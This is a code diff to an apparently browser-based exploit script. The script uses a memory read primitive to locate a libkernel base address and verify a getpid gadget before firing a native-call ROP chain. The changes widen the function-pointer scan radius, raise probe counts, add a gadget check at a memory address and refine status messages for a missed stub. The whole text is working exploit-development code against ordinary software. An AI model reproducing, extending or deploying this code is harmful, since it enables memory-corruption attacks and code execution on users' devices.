@@ -57,7 +57,7 @@ import {
     resolveLibkernelRelroChunk,
     verifyLibkernelZeroRead,
     calcLkFromFnPtrZeroRead,
-    resolveGetpidStub, saveLastFnPtr, loadLastFnPtr,
+    resolveGetpidStub, saveLastFnPtr, loadLastFnPtr, isGetpidStubAt,
     calcLkBestFromFnPtr,
     resolveLkOnePltStep,
     extPtrToLkCandidates,
@@ -87,7 +87,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830bd";
+const BUILD_ID = "rw-20250830be";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 getpid", title: "getpid @ lk (chain_poops) — needs lk in box" },
@@ -838,7 +838,12 @@ function ensureNativePrepForFire(p, off, nm) {
 
 /** Verified getpid stub — fn+delta when lk is page-aligned off from exports. */
 function resolveGetpidStubOff(p, lk, off) {
-    return resolveGetpidStub(p, lk, off, { fnPtr: fnFromUi(), maxProbes: 512 });
+    return resolveGetpidStub(p, lk, off, {
+        fnPtr: fnFromUi(),
+        fnRadius: 0x20000,
+        fnProbes: 1024,
+        maxProbes: 512,
+    });
 }
 
 /** lk resolved on live primitive — no reload before native fire. */
@@ -1233,7 +1238,7 @@ function runManualTest(testId) {
                 return;
             }
             const v = read8p(p, lk.add32(o));
-            if (isGetpidStub(v))
+            if (isGetpidStub(v) || isGetpidStubAt(p, lk.add32(o)))
                 mark("GADGET-OK", "getpid stub @ lk+" + o.toString(16));
             else
                 mark("GADGET-BAD", "stub @+" + o.toString(16) + " read8=" + (v ? String(v) : "null"));
@@ -3124,7 +3129,7 @@ function runOneReadLk() {
 }
 
 function acceptLkFromHex(hexOverride) {
-    const off = loadEffectiveOff();
+    const off = lkCalcOff();
     let hex = hexOverride != null ? String(hexOverride).trim().replace(/^0x/i, "") : "";
     if (!hex && addrIn && addrIn.value)
         hex = addrIn.value.trim().replace(/^0x/i, "");
@@ -3150,11 +3155,16 @@ function acceptLkFromHex(hexOverride) {
         if (addrIn) addrIn.value = hex;
         let stubNote = "";
         if (window.p) {
-            const stub = resolveGetpidStub(window.p, h.lk, off, { fnPtr: ptr, maxProbes: 256 });
+            const stub = resolveGetpidStub(window.p, h.lk, off, {
+                fnPtr: ptr, fnRadius: 0x20000, fnProbes: 512, maxProbes: 256,
+            });
             if (stub.verified)
                 stubNote = " stub=" + stub.tag;
             else
-                stubNote = " stub=MISS (Start first?)";
+                stubNote = " stub=MISS peek=" + (stub.peek != null ? stub.peek : "?")
+                    + " (Start→Accept again or N0 will fn-scan)";
+        } else {
+            stubNote = " stub=pending (Start→Accept again)";
         }
         mark("LK-OK", "fn=" + hex + " → lk=" + h.lk + " (" + h.via + ")" + stubNote);
         state("fn accepted — lk in session", "ok");
